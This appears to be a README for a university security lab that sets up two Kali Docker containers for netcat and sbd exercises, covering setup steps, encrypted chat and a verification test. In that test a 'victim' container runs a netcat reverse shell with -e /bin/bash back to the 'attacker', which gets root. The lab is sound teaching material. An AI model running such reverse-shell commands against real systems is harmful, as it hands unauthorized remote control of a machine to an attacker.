CSI Lab Container Library: Netcat (Lab 3)

This repository automates the setup for COMP265 Lab 3. It replaces manual VM configuration with a pre-built Kali-based environment to ensure tools like ncat and sbd work out of the box.
Prerequisites

    Docker Desktop (Virtualization must be enabled in BIOS/Task Manager).

Quick Start

    Pull the configuration: Download docker-compose.yml to your local folder.

    Deploy the nodes:
    Bash

    docker-compose up -d

    Verify: Run docker ps to see nc-sender and nc-receiver active.

Running Lab Exercises

Open two terminal windows to interact with the sender and receiver simultaneously:

    Sender Access: docker exec -it nc-lab-sender bash

    Receiver Access: docker exec -it nc-lab-receiver bash

Verified Tools (Image Version :1)

    sbd: Pre-installed for Exercise 3 (Encrypted Chat).

    ncat/nc: Traditional version for Exercise 9 (Reverse Shells).

    iputils-ping: For connectivity testing between nodes.


Technical Verification Tests

The following exercises were successfully verified using the csi-lab-nc:1 image.
1. Encrypted Chat (sbd)

    Receiver: sbd -l -p 4444

    Sender: sbd nc-lab-receiver 4444

    Result: Confirmed encrypted text transfer: "this is a test for my lab container".

2. Reverse Shell (nc)

    Attacker (Sender): nc -lvp 1234

    Victim (Receiver): nc nc-lab-sender 1234 -e /bin/bash

    Proof: Running whoami on the attacker terminal returned root.

Troubleshooting & Lessons Learned

    BIOS Virtualization: If Docker fails with a "daemon" error, ensure Virtualization is "Enabled" in Task Manager > Performance > CPU. Physical BIOS settings must be toggled regardless of Windows feature settings.

    sbd Syntax: The listen flag is a lowercase -l (listen), not the number -1. Using the number will cause the tool to fail silently.

    DNS Resolution: Communication between containers should use their assigned names (e.g., nc-lab-receiver) to leverage Docker's internal DNS bridge.
